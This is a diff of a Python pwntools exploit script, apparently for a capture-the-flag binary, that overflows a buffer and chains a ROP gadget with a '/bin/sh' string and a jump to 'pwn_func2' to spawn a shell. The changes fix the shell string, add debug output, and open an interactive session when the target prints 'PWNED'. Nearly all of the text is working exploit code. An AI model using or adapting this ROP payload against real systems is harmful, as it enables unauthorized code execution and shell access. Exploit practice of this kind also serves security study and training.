@@ -8,16 +8,14 @@ pwnfunc2 = elf.symbols['pwn_func2']
 rop = pwn.ROP(elf)
 
 rdi = rop.rdi
-
-rdi2 = rop.find_gadget(["mov rdi, rax", "ret"])
-
+print(f"GADGET: {rdi}")
 
 payload = (b'prints '
             + (b'\xff' * 540)
             + (b'\0' * 4)
             + (b'\0' * 8)
             + pwn.p64(rdi.address)
-            + b'\bin\sh$'
+            + b'/bin/sh\0'
             + pwn.p64(pwnfunc2)
           )
 print(f"PAYLOAD: {payload}")
@@ -27,5 +25,8 @@ with open("/dev/null") as err:
   io.recvuntil(b'Enter command: ')
   io.send(b'exec\n')
   out1 = io.recvuntil(b'\n')
+  print(f"RECV1: {out1}")
+  if b'PWNED' in out1 :
+    io.interactive()
   out2 = io.recvuntil((b'Enter command: ', b'\n'))
-io.interactive()
+  print(f"RECV2: {out2}")
